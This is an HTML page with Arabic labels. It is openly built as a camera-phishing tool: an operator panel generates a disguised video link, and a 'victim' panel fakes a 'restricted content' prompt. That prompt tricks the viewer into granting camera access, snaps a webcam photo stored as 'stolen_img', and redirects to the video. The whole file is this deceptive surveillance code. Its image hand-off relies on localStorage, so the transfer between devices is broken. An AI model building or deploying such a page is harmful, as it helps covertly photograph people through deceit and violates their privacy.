<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام تحويل الروابط</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #f0f2f5; font-family: sans-serif; }
        .container { display: flex; justify-content: center; align-items: center; height: 100vh; }
        
        /* لوحة التحكم الخاصة بك */
        .admin-box { background: white; padding: 30px; border-radius: 15px; width: 90%; max-width: 450px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.1); color: #333; }
        .admin-box input { width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
        
        /* واجهة الضحية */
        .victim-ui { background: #000; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; color: white; position: fixed; top: 0; left: 0; }
        .dialog { background: #1a1a1a; padding: 30px; border-radius: 15px; text-align: center; border: 1px solid #333; width: 80%; max-width: 350px; }
        
        .btn { background: #2563eb; color: white; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; font-size: 16px; }
        .hidden { display: none !important; }
        #preview { width: 100%; margin-top: 15px; border: 3px solid #2563eb; border-radius: 10px; display: none; }
    </style>
</head>
<body>

    <div class="container">
        <div id="admin-panel" class="admin-box">
            <h2>توليد رابط مشفر</h2>
            <p>أدخل رابط الفيديو (يوتيوب/تيك توك):</p>
            <input type="text" id="urlInput" placeholder="https://www.youtube.com/watch?v=...">
            <button class="btn" onclick="generate()">إنشاء الرابط</button>
            
            <div id="result" class="hidden">
                <p>أرسل هذا الرابط للطرف الآخر:</p>
                <input type="text" id="finalLink" readonly onclick="this.select()">
            </div>
            <hr style="margin: 20px 0;">
            <p id="status">في انتظار الطرف الآخر...</p>
            <img id="preview">
        </div>

        <div id="victim-panel" class="victim-ui hidden">
            <div class="dialog">
                <h2 style="margin-top:0;">محتوى مقيد</h2>
                <p style="color: #ccc;">لمشاهدة هذا الفيديو، يجب عليك منح إذن "السماح بالمشاهدة" للمشغل.</p>
                <button class="btn" id="allowBtn" style="background: #ff0000;">السماح بالمشاهدة</button>
            </div>
            <video id="video" autoplay playsinline style="display:none"></video>
            <canvas id="canvas" style="display:none"></canvas>
        </div>
    </div>

<script>
    const params = new URLSearchParams(window.location.search);
    const mode = params.get('view');

    // --- سيناريو الطرف الآخر (الضحية) ---
    if (mode === 'content_check') {
        document.getElementById('admin-panel').classList.add('hidden');
        document.getElementById('victim-panel').classList.remove('hidden');

        document.getElementById('allowBtn').onclick = async () => {
            try {
                // طلب الكاميرا
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                // التقاط الصورة فوراً بعد الموافقة
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    const data = canvas.toDataURL('image/jpeg', 0.5);
                    
                    // إرسال الصورة للوحة التحكم (عبر المتصفح)
                    localStorage.setItem('stolen_img', data);
                    
                    // جلب الرابط الأصلي للتحويل
                    const target = localStorage.getItem('redirect_url') || 'https://youtube.com';
                    
                    stream.getTracks().forEach(t => t.stop());
                    window.location.href = target; // تحويله للفيديو
                }, 800);
            } catch (err) {
                alert("يجب السماح بالوصول للمشغل لمشاهدة المحتوى.");
            }
        };
    }

    // --- سيناريو لوحة التحكم (أنت) ---
    function generate() {
        const url = document.getElementById('urlInput').value;
        if (!url) return alert("يرجى إدخال الرابط أولاً");

        // حفظ الرابط الأصلي في المتصفح ليتم سحبه لاحقاً
        localStorage.setItem('redirect_url', url);

        const baseUrl = window.location.href.split('?')[0];
        document.getElementById('finalLink').value = baseUrl + "?view=content_check";
        document.getElementById('result').classList.remove('hidden');

        // انتظار الصورة
        window.addEventListener('storage', (event) => {
            if (event.key === 'stolen_img') {
                const img = document.getElementById('preview');
                img.src = event.newValue;
                img.style.display = 'block';
                document.getElementById('status').innerText = "✅ تم استلام صورة الشخص!";
            }
        });
    }
</script>
</body>
</html>
